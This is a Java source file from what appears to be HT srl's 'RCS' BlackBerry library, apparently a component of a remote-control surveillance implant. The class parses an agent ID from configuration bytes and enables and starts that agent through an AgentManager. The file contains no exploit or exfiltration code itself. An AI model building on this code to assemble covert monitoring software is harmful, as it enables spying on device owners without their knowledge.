//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : StartAgentAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.event.Event;

// TODO: Auto-generated Javadoc
/**
 * The Class StartAgentAction.
 */
public final class StartAgentAction extends SubAction {
    private int agentId;

    /**
     * Instantiates a new start agent action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public StartAgentAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        //#ifdef DEBUG_INFO
        debug.info("Starting " + agentId);
        //#endif
        final AgentManager agentManager = AgentManager.getInstance();

        agentManager.enable(agentId);
        boolean ret;

        ret = agentManager.start(agentId);

        return ret;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            //#ifdef DEBUG_INFO
            debug.info("agentId: " + agentId);
            //#endif

        } catch (final EOFException e) {
            //#ifdef DEBUG_ERROR
            debug.error("params FAILED");
            //#endif
            return false;
        }

        return true;
    }

}
